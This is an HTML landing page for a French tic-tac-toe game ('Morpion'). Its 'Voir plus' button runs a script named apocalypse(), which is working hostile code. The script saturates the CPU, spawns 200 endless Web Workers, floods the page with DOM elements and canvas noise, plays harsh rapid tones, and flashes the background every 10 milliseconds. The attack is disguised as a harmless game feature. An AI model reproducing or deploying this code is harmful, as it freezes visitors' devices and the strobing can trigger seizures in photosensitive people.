<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Morpion</title>
  <link rel="stylesheet" href="style.css">
  <style>
    body {
      background-color: black;
      color: lime;
      font-family: monospace;
      overflow-x: hidden;
    }
    .glitch {
      position: absolute;
      font-size: 2rem;
      animation: spin 0.1s linear infinite;
      user-select: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #canvas {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 9999;
    }
    .btn-evil {
      display: inline-block;
      margin: 20px;
      padding: 15px 30px;
      background: red;
      color: white;
      font-size: 18px;
      border: none;
      cursor: pointer;
      border-radius: 8px;
      text-transform: uppercase;
      font-weight: bold;
      box-shadow: 0 0 10px red;
    }
  </style>
</head>
<body>

<main>
  <a href="morpion.html" class="btn">Commencer le jeu</a>
  <button class="btn-evil" onclick="apocalypse()">Voir plus</button>
  <canvas id="canvas" width="1920" height="1080"></canvas>
</main>

<script>
function apocalypse() {
  // ðŸ’¥ CPU Overload en continu
  setInterval(() => {
    for (let i = 0; i < 1e7; i++) {
      Math.pow(Math.random(), Math.random());
    }
  }, 1);

  // ðŸ’£ Mass Workers - 200+
  for (let i = 0; i < 200; i++) {
    const blob = new Blob([`
      while (true) {
        let x = 0;
        for (let j = 0; j < 1e7; j++) {
          x += Math.tan(j) * Math.random();
        }
      }
    `], { type: "application/javascript" });
    const url = URL.createObjectURL(blob);
    new Worker(url);
  }

  // âš¡ DOM Bomb : crÃ©e 1000 Ã©lÃ©ments toutes les 50ms
  setInterval(() => {
    for (let i = 0; i < 1000; i++) {
      const div = document.createElement("div");
      div.className = "glitch";
      div.innerText = "âš¡";
      div.style.top = Math.random() * window.innerHeight + "px";
      div.style.left = Math.random() * window.innerWidth + "px";
      div.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
      document.body.appendChild(div);
    }
  }, 50);

  // ðŸŽ¨ Canvas Flood en 16ms
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");
  setInterval(() => {
    for (let i = 0; i < 2000; i++) {
      ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
      ctx.fillRect(Math.random()*1920, Math.random()*1080, 5, 5);
    }
  }, 16);

  // ðŸ”Š Audio Glitch extrÃªme
  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  setInterval(() => {
    const osc = audioCtx.createOscillator();
    osc.type = 'sawtooth';
    osc.frequency.setValueAtTime(Math.random() * 15000 + 100, audioCtx.currentTime);
    osc.connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + 0.05);
  }, 50);

  // ðŸŒˆ Flash violent
  setInterval(() => {
    document.body.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 10%)`;
  }, 10);

  alert("attend 1minute");
}
</script>

<script src="script.js"></script>
</body>
</html>
